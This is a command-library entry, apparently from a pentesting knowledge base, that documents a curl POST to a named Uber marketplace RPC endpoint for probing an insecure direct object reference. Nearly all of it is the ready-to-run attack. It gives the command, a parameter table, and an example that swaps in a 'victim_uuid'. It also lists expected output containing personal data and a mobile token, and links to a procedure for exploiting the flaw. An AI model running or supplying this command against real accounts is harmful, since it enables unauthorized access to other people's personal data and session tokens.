---
data: >-
  curl -X POST
  'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H
  'Content-Type: application/json' -d '{"userUuid": "uuid_here"}'
tags:
  - http
  - api
  - post
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: eda30231-baa0-4ac9-829d-c96ff146bea6
created_at: '2025-12-11T06:10:28.613Z'
updated_at: '2025-12-11T06:10:28.613Z'
verified: false
validated: true
submitted: true
---
# curl-post-uber-api

## Command

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "uuid_here"}'
```

## Description

Sends a POST request to the Uber marketplace API endpoint to query user details via the userUuid parameter, useful for testing IDOR vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"userUuid": "uuid_here"}'` | JSON payload with userUuid | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "test_uuid"}'
```

### Advanced Usage

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -H 'Authorization: Bearer token' -d '{"userUuid": "victim_uuid"}'
```

## Expected Output

JSON response containing user sensitive data if successful, e.g., {"personalData": "...", "mobileToken": "..."}

## Related

- [[tools/curl]]
- [[procedures/Exploit-IDOR-by-Modifying-userUuid]]
